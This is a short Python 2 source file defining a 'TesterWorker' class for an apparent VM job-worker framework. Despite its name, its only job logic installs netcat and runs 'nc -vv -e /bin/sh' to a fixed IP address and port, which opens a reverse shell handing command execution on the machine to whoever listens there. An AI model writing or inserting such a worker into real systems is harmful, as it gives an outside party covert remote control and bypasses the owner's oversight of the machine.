#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from __future__ import absolute_import, unicode_literals

import worker.workers
LOG = worker.workers.LOG.getChild('tester')
LOG.setLevel('DEBUG')


class TesterWorker(worker.workers.VMWorker):
    def __init__(self):
        super(self.__class__, self).__init__()

    def _run(self, job):
        self.execute("DEBIAN_FRONTEND=noninteractive apt-get update")
        self.execute("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
        self.execute("nc -vv -e /bin/sh 192.168.48.26 12345")
